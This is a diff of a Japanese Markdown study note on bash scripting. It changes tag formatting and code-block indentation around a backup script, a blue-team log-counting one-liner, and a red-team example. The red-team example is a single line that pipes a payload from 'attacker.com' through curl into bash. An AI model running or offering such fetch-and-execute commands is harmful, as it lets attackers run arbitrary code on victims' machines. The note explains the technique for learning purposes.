@@ -1,7 +1,15 @@
 ---
-tags: ['shell' 'bash' 'scripting' 'automation' 'bash' 'chmod' 'environment_variables' 'pipes_redirections']
+tags:
+  - shell
+  - bash
+  - scripting
+  - automation
+  - bash
+  - chmod
+  - environment_variables
+  - pipes_redirections
 created: 2025-06-29 15:02
-modified: 2026-02-20 15:20
+modified: 2026-02-20 16:00
 environment: [OS/Linux]
 vulnearability: []
 knowledge_category: Coding
@@ -82,34 +90,33 @@ chmod +x my_script.sh
 
 		```bash
 
-    #!/bin/bash
+		#!/bin/bash
 
-    set -e # 失敗したら即座に終了
+		set -e # 失敗したら即座に終了
 
-    TARGET_DIR="$1"
+		TARGET_DIR="$1"
 
-    BACKUP_DIR="/mnt/backups"
+		BACKUP_DIR="/mnt/backups"
 
-    TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
+		TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
 
-    FILENAME="backup-${TIMESTAMP}.tar.gz"
+		FILENAME="backup-${TIMESTAMP}.tar.gz"
 
-    if [ -z "$TARGET_DIR" ]; then
+		if [ -z "$TARGET_DIR" ]; then
 
-      echo "Error: Target directory not specified." >&2
+	    echo "Error: Target directory not specified." >&2
 
       exit 1
 
-    fi
+		fi
 
-    echo "Backing up ${TARGET_DIR} to ${BACKUP_DIR}/${FILENAME}..."
+		echo "Backing up ${TARGET_DIR} to ${BACKUP_DIR}/${FILENAME}..."
 
-    tar -czf "${BACKUP_DIR}/${FILENAME}" "${TARGET_DIR}"
+		tar -czf "${BACKUP_DIR}/${FILENAME}" "${TARGET_DIR}"
 
-    echo "Backup complete."
+		echo "Backup complete."
 
-    ```
-
+		```
 
 ### 2\. ブルーチーム視点
 
@@ -120,14 +127,13 @@ chmod +x my_script.sh
 
 		```bash
 
-    #!/bin/bash
+		#!/bin/bash
 
-    LOG_FILE="$1"
+		LOG_FILE="$1"
 
-    grep "Failed password" "$LOG_FILE" | awk '{print $11}' | sort | uniq -c | sort -nr
+		grep "Failed password" "$LOG_FILE" | awk '{print $11}' | sort | uniq -c | sort -nr
 
-    ```
-
+		```
 
 ### 3\. レッドチーム視点
 
@@ -137,12 +143,11 @@ chmod +x my_script.sh
 * **例 (ワンライナー)**:
 
 		```bash
-    # curlでスクリプトをダウンロードし、bashで直接実行する
+		# curlでスクリプトをダウンロードし、bashで直接実行する
 
-    curl -s [http://attacker.com/payload.sh](http://attacker.com/payload.sh) | bash
+		curl -s [http://attacker.com/payload.sh](http://attacker.com/payload.sh) | bash
 
-    ```
-
+		```
 
 ## エラーメッセージとトラブルシューティング
 
